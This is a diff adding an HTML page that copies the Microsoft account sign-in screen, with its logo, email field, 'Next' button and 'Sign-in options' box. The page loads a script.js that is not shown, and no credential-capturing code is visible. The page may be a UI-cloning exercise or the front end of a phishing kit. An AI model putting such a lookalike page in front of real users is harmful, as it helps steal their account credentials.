@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
+    <title>Sign in your Microsoft account</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(to right, #e9d7d1, #e9d7d0 , #e5ddd9 , #d1dbe5 , rgba(219,226,232,255) , #dbe2e8 , #d9e2d8 ,
+            #e0e3d2 ,#e8d8d2 , #dae2d3);
+          
+        }
+    </style>
+</head>
+<body class="relative flex flex-col items-center justify-center min-h-screen overflow-hidden">
+ 
+    
+    
+   
+    <div class="relative z-10 bg-white p-8 shadow-md w-full max-w-md text-left">
+        
+        <img src="microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft Logo" class="w-24 mb-4">
+    
+        
+        <h2 class="text-2xl font-semibold mb-4 text-gray-800">Sign in</h2>
+    
+        
+        <form id="signInForm" class="w-full">
+            
+            <input 
+                type="text" 
+                placeholder="Email, phone, or Skype" 
+                id="email"
+                required 
+                class="w-full py-2 mb-4 border-b-2 border-gray-300 focus:outline-none focus:border-blue-600 transition-colors text-gray-700"
+            >
+    
+           
+            <div class="text-sm text-gray-500 mb-4">
+                <span>No account? <a href="#" class="text-blue-600 hover:underline">Create one!</a></span>
+            </div>
+    
+            
+            <div class="flex">
+                <button 
+                    type="submit" 
+                    class="p-1 px-9 bg-blue-800 text-white font-medium hover:bg-blue-700 transition-colors ml-auto"
+                >
+                    Next
+                </button>
+            </div>
+        </form>
+    </div>
+    
+
+   
+    <div 
+        class="relative z-10 flex items-center justify-center w-full mt-4 p-2 border border-gray-300 cursor-pointer hover:bg-gray-100 transition-colors bg-white shadow-md max-w-md"
+    >
+        <img src="signin_options_4e48046ce74f4b89d450.svg" alt="Key Icon" class="w-5 h-5 mr-2">
+        <span class="text-gray-700">Sign-in options</span>
+    </div>
+</body>
+
+<script src="script.js"></script>
+</html>
